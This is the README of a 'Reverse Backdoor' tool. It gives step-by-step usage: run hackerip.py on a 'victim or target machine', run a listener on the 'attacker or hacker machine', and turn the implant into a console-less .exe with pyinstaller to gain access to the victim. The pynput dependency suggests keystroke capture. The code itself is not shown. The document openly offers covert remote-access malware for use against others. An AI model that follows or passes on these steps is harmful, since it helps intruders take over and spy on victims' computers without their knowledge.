# Reverse Backdoor

1. Required Installation  (Run as admin):
   ```
   pip install pynput pyinstaller
   ```
   

2. hackerip.py (Main file to run in victim or target machine). This starts the backdoor process. Remember both rbackdoor.py and hackerip.py files must be      in the victim machine to work this:
   ```
   python hackerip.py
   ```


3. listener.py (run this file on the attacker or hacker machine to listen ). This waits for the victim to connect:
   ```
   python listener.py
   ```

5. You can covert hackerip.py to .exe using the command ( the output .exe file can be used to get access to the victim mahcine):
   ```
   pyinstaller hackerip.py --onefile --noconsole
   ```



